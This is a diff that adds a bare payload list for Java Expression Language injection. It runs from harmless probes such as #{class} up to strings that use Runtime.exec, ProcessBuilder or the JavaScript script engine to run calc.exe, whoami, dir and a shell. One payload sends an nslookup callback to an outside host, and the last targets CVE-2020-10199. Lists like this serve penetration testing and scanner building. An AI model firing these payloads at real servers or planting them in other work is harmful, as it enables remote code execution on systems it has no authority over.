@@ -1,0 +1,25 @@
+#{empty}
+#{class}
+#{request}
+#{java}
+#{ T(java.lang.Math).random() * 10.0}
+${‘this is el vulnerability’.toUpperCase()}
+${‘a’.concat(‘b’)}
+${‘a’.getClass()}
+“${‘a’.getClass().forName(‘sun.misc.Launcher’).newInstance()}
+$\\A{‘’.getClass().forName(‘java.lang.Runtime’).getMethods()[6].invoke(null).exec(‘calc.exe’)}
+${‘a’.getClass().forName(‘java.lang.Runtime’).newInstance().getEngineFactories()[0].exec(‘calc.exe’)}
+${‘a’.getClass().forName(‘javax.script.ScriptEngineManager’).newInstance()}
+${‘a’.getClass().forName(‘javax.script.ScriptEngineManager’).newInstance().getEngineFactories()[0].getLanguageName()}
+${‘a’.getClass().forName(‘javax.script.ScriptEngineManager’).newInstance().getEngineByName(‘JavaScript’).eval(\”new java.lang.String(‘xxx’)\”)}
+${‘a’.getClass().forName(‘javax.script.ScriptEngineManager’).newInstance().getEngineByName(‘JavaScript’).eval(\”new java.lang.ProcessBuilder[‘(java.lang.String[])’]([‘calc.exe’]).start()\”)}
+${‘a’.getClass().forName(‘javax.script.ScriptEngineManager’).newInstance().getEngineByName(‘JavaScript’).eval(\”var x=new java.lang.ProcessBuilder; x.command(\\\”whoami\\\”); x.start()\”)}
+${‘a’.getClass().forName(‘javax.script.ScriptEngineManager’).newInstance().getEngineByName(‘JavaScript’).eval(\”var x=new java.lang.ProcessBuilder; x.command(\\\”dir\\\”); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\”)}
+${‘a’.getClass().forName(‘javax.script.ScriptEngineManager’).newInstance().getEngineByName(‘JavaScript’).eval(\”var x=new java.lang.ProcessBuilder; x.command(\\\”ping\\\”,\\\”127.0.0.1\\\”); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\”)}
+${‘a’.getClass().forName(‘javax.script.ScriptEngineManager’).newInstance().getEngineByName(‘js’).eval(\”java.lang.Runtime.getRuntime().exec(\\\”calc.exe\\\”)\”)}
+${‘a’.getClass().forName(‘javax.script.ScriptEngineManager’).newInstance().getEngineByName(‘JavaScript’).eval(\”java.lang.Runtime.getRuntime().exec(\\\”calc.exe\\\”)\”)}
+${‘a’.getClass().forName(‘javax.script.ScriptEngineManager’).newInstance().getEngineByName(‘JavaScript’).eval(\”java.lang.Runtime.getRuntime().exec(\\\”cmd.exe /C start http://127.0.0.1:8000\\\")\")}
+${‘a’.getClass().forName(‘javax.script.ScriptEngineManager’).newInstance().getEngineByName(‘JavaScript’).eval(\”var x=new java.lang.ProcessBuilder; x.command(\\\”whoami\\\”); x.start()\”)}
+${“”.getClass().forName(“javax.script.ScriptEngineManager”).newInstance().getEngineByName(“JavaScript”).eval(“new java.lang.ProcessBuilder[‘(java.lang.String[])’]([‘/bin/sh’,’-c’,’nslookup jndi.s.artsploit.com’]).start()”)}
+${‘a’.getClass().forName(‘javax.script.ScriptEngineManager’).newInstance().getEngineByName(‘JavaScript’).eval(\”new java.lang.ProcessBuilder[‘(java.lang.String[])’]([‘calc.exe’]).start()\”)}
+$\\A{‘’.getClass().forName(‘java.lang.Runtime’).getMethods()[6].invoke(null).exec(‘touch /tmp/cve-2020–10199’)}
